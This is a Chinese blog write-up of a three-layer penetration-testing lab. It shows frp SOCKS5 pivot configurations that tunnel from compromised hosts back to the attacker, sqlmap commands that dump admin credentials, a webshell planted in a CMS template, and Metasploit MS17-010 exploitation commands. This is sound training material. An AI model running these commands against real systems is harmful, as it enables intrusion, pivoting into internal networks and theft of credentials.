@@ -1,0 +1,299 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>frp--CFS三层靶场渗透 | pfortunew</title><meta name="author" content="pmj"><meta name="copyright" content="pmj"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="frp代理转发frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定 一级代理配置服务端 在服务端上传frp, 并配置frps.ini 123[common]bind_addr &#x3D; 0.0.0.0   #服务端监听地址 默认0.0.0.0bind_port &#x3D; 7000    #服务端监听端口  启动服务端, 执行命令开启frps等待连接">
+<meta property="og:type" content="article">
+<meta property="og:title" content="frp--CFS三层靶场渗透">
+<meta property="og:url" content="http://example.com/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="pfortunew">
+<meta property="og:description" content="frp代理转发frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定 一级代理配置服务端 在服务端上传frp, 并配置frps.ini 123[common]bind_addr &#x3D; 0.0.0.0   #服务端监听地址 默认0.0.0.0bind_port &#x3D; 7000    #服务端监听端口  启动服务端, 执行命令开启frps等待连接">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/202404021712064350774422.jpg">
+<meta property="article:published_time" content="2024-09-17T13:37:00.402Z">
+<meta property="article:modified_time" content="2024-09-17T13:42:07.467Z">
+<meta property="article:author" content="pmj">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/202404021712064350774422.jpg"><link rel="shortcut icon" href="/img/202404021712064350774422.jpg"><link rel="canonical" href="http://example.com/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'frp--CFS三层靶场渗透',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-17 21:42:07'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/./img/202404021712064350774422.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="pfortunew"><span class="site-name">pfortunew</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">frp--CFS三层靶场渗透</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-17T13:37:00.402Z" title="发表于 2024-09-17 21:37:00">2024-09-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-17T13:42:07.467Z" title="更新于 2024-09-17 21:42:07">2024-09-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="frp--CFS三层靶场渗透"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="frp代理转发"><a href="#frp代理转发" class="headerlink" title="frp代理转发"></a>frp代理转发</h2><p>frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定</p>
+<h3 id="一级代理"><a href="#一级代理" class="headerlink" title="一级代理"></a>一级代理</h3><p><strong>配置服务端</strong></p>
+<p>在服务端上传frp, 并配置frps.ini</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0   <span class="comment">#服务端监听地址 默认0.0.0.0</span></span><br><span class="line">bind_port = 7000    <span class="comment">#服务端监听端口</span></span><br></pre></td></tr></table></figure>
+
+<p>启动服务端, 执行命令开启frps等待连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>配置客户端</strong>(受控的靶机, 也就是拿到shell的target1)</p>
+<p>在客户端上传frp, 并配置frpc.ini<br>(也就是上传frpc 和 frpc.ini)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.1.129  <span class="comment"># 指向frp服务端绑定的ip, 也就是攻击机kali</span></span><br><span class="line">server_port = 7000           <span class="comment"># 指向frp服务端绑定的端口</span></span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080           <span class="comment"># 代理所使用的端口，会被转发到服务端</span></span><br><span class="line">plugin = socks5              <span class="comment"># 代理的类型</span></span><br></pre></td></tr></table></figure>
+
+<p>启动客户端</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frpc</span><br><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="二级代理"><a href="#二级代理" class="headerlink" title="二级代理"></a>二级代理</h3><p>kali 的 1 网段通过代理连接到 <code>target1</code> 的22 网段, 现在需要通过通过kali的1网段, 连接到 <code>target2</code> 的33网段<br>那么就弄一个<code>target1</code>的 22网段 到<code>target2</code> 的33网段的代理<br>这样就实现了 kali的1网段 代理到target2 的33网段</p>
+<p><strong>kali的服务端依旧</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0   # 在服务端上绑定的ip</span><br><span class="line">bind_port = 7000      # 在服务端上绑定的端口</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>target1的客户端</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">tls_enable = true</span><br><span class="line">server_addr = 192.168.1.129    # kali的frp服务端绑定的ip</span><br><span class="line">server_port = 7000             # kali的frp服务端绑定的端口</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp                     # 所使用的协议类型</span><br><span class="line">remote_port = 1080             # 要转发到的远程端口</span><br><span class="line"># plugin = socks5  不能加上这个</span><br><span class="line"># 相较于一级代理增加的配置</span><br><span class="line">local_ip = 192.168.22.128      # 本地监听的ip地址（本地的ip）</span><br><span class="line">local_port = 10808             # 要转发的本地端口</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>
+
+<p><strong>target1的服务端frps.ini</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.22.128   # target1上本地ip</span><br><span class="line">bind_port = 7000             # target1的frp服务端绑定的端口</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>target2的客户端frpc.ini</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.22.128  # 指向target1的服务端绑定的ip</span><br><span class="line">server_port = 7000            # 指向target1的服务端绑定的端口</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10808</span><br><span class="line">plugin = socks5       # 代理的类型</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击机kali: 192.168.1.129</span><br><span class="line">Targ1 CentOS: 192.168.1.128   192.168.22.128</span><br><span class="line">Targ2 Ubuntu: 192.168.22.129  192.168.33.128 </span><br><span class="line">Targ3 Windows: 192.168.33.33</span><br></pre></td></tr></table></figure>
+
+<p>主要是为了学习一下frp的代理, 所以比较简单</p>
+<h2 id="target1"><a href="#target1" class="headerlink" title="target1"></a>target1</h2><p>访问80端口, tp5框架, 工具直接梭, getshell</p>
+<p>蚁剑连接, 查看一下网络, 可以看到 22网段</p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917152041531.png" alt="image-20240917152041531"></p>
+<p>利用frp进行代理转发</p>
+<p>在kali攻击机上启动 服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">Bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917152959858.png" alt="image-20240917152959858"></p>
+<p>启动客户端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.1.130</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917153315401.png" alt="image-20240917153315401"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frpc</span><br><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>
+
+<p>可以看到服务端(kali)  显示连接成功</p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917153752042.png" alt="image-20240917153752042"></p>
+<p>现在已经在kali和target1之间搭建了一个SOCKS5代理服务</p>
+<p>接下来就可以借助第三方工具，可以让计算机的其他应用使用这个socks5代理</p>
+<p>比如sockscap , proxifier 或者linux上面的proxychains等</p>
+<p>windows上面配置sockscap<br><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917154444826.png" alt="image-20240917154444826"></p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917154459531.png" alt="image-20240917154459531"></p>
+<p>现在就可以直接访问到   <code> http://192.168.22.129/</code></p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917155038894.png" alt="image-20240917155038894"></p>
+<p>在kali上面使用proxychains,  编辑&#x2F;etc&#x2F;proxychains.conf , 将socks5代理服务器的地址指向frp服务端的地址</p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917155230028.png" alt="image-20240917155230028"></p>
+<p>执行命令在前面加上<code>proxychains</code> 便可以应用此socks5代理</p>
+<p>然后浏览器上配置一下代理, kali的浏览器也可以访问到target2的网站了</p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917154733911.png" alt="image-20240917154733911"></p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917155444192.png" alt="image-20240917155444192"></p>
+<h2 id="target2"><a href="#target2" class="headerlink" title="target2"></a>target2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap 192.168.22.0/24   扫描一下具体的ip地址</span><br><span class="line">proxychains4 nmap -Pn -sT 192.168.22.129  扫描一下开放的端口</span><br></pre></td></tr></table></figure>
+
+<p>访问80端口是给了提示进行sql注入</p>
+<p>sqlmap跑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; --dbs</span><br><span class="line">proxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -D bagecms --tables</span><br><span class="line">proxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -D bagecms -T bage_admin --columns</span><br><span class="line">proxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -D bagecms -T bage_admin -C username,password --dump</span><br></pre></td></tr></table></figure>
+
+<p>速度很快的就可以跑出来, 之前使用msf进行代理 跑sqlmap根本跑不出来</p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917161429606.png" alt="image-20240917161429606"></p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917161810705.png" alt="image-20240917161810705"></p>
+<p>有了账号密码登录后台, 在模板里面写入一句话木马, 然后蚁剑连接, </p>
+<p>sockscap里面配置好了代理, 把蚁剑的程序加上去, 就可以使用代理了</p>
+<p>可以发现到33网段</p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917162448076.png" alt="image-20240917162448076"></p>
+<p>进行一个二级代理, 将33网段连接到kali的1网段</p>
+<p>kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>
+
+<p>target1客户端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">tls_enable = true</span><br><span class="line">server_addr = 192.168.1.129</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">local_ip = 192.168.22.128</span><br><span class="line">local_port = 10808</span><br></pre></td></tr></table></figure>
+
+<p>target1服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.22.128</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>
+
+<p>target2 客户端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.22.128</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10808</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali--&gt;    ./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line">target1--&gt; ./frpc -c ./frpc.ini</span><br><span class="line">target1--&gt; ./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line">target2--&gt; ./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>
+
+<p>开始这样做的时候一直 显示是这个连接, 按理应该是连接到 <code>[socks5]</code>,<br>而且<code>proxychains nmap -Pn -sT 192.168.33.33</code>扫描端口也扫不出, 都是没反应的, 显然是没能成功的代理到33网段</p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917205952931.png" alt="image-20240917205952931"></p>
+<p>卡了好久, 后面就尝试先让 target1 连上 target2 , 然后再kali连target1, </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target1 --&gt; ./frps -c ./frps.ini</span><br><span class="line">target2 --&gt; ./frpc -c ./frpc.ini</span><br><span class="line"></span><br><span class="line">kali --&gt;    ./frps -c ./frps.ini</span><br><span class="line">target1 --&gt; ./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>
+
+<p>测试扫描一下端口, 有反应, 说明连上了 (也有点懵, 不知道为什么之前那样连不上, 看其他人的博客是那样连上去的啊)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.33.33</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917205556773.png" alt="image-20240917205556773"></p>
+<h2 id="target3"><a href="#target3" class="headerlink" title="target3"></a>target3</h2><p>用proxychains 打开msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>打永恒之蓝正向连接的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.33.33</span><br><span class="line">options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>可以打通</p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917210912603.png"></p>
+<p>在<code>meterpreter</code>终端 倒是可以执行一下命令啥的, 但是输入 <code>shell</code> 好像进不去shell, 不太稳定还是干嘛</p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917212025790.png" alt="image-20240917212025790"></p>
+<p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917212121553.png" alt="image-20240917212121553"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">还有点奇怪的是不知道为什么kali的地址莫名奇妙的变成了 192.168.1.129, 但是之前的kali的地址是 192.168.1.130</span><br><span class="line">所以 proxychains配置文件里面的地址还写的是 192.168.1.130 也能打出来, 将地址改成了192.168.1.129, 也是一样的结果, 也没啥变化, 有点不理解</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考文章:</span><br><span class="line">https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">pmj</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/">http://example.com/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">pfortunew</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/./img/202404021712064350774422.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/" title="CFS三层靶机渗透--msf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CFS三层靶机渗透--msf</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/./img/202404021712064350774422.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pmj</div><div class="author-info__description">求知</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/pwfortune" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/2302_80472909?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:3058986501@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: 